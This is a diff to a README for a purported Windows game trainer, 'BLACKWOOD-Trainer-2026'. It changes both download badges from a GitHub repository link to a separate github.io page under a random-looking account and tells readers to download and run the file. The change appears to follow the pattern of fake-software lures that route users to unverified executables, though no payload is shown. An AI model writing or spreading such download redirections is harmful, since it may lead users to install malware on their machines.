@@ -17,7 +17,7 @@ BLACKWOOD-Trainer-2026 is a powerful yet easy-to-use Windows utility designed to
 
 ### Step 1: Get the Application
 
-[![DOWNLOAD BLACKWOOD-Trainer-2026](https://img.shields.io/badge/Download-BLACKWOOD%20Trainer%202026-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/readymixgenuseupatorium5558/BLACKWOOD-Trainer-2026)
+[![DOWNLOAD BLACKWOOD-Trainer-2026](https://img.shields.io/badge/Download-BLACKWOOD%20Trainer%202026-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://readymixgenuseupatorium5558.github.io)
 
 Visit this link to download the application. The download page will open in your browser. Look for the latest release and click the download button.
 
@@ -231,7 +231,7 @@ Remember to save your profiles regularly and experiment with different configura
 
 Enjoy your enhanced gaming experience with BLACKWOOD-Trainer-2026!
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-BLACKWOOD%20Trainer%202026-success?style=for-the-badge)](https://github.com/readymixgenuseupatorium5558/BLACKWOOD-Trainer-2026)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-BLACKWOOD%20Trainer%202026-success?style=for-the-badge)](https://readymixgenuseupatorium5558.github.io)
 
 Visit this link to download the application. Once downloaded, run the file and start customizing your gaming setup immediately.
 
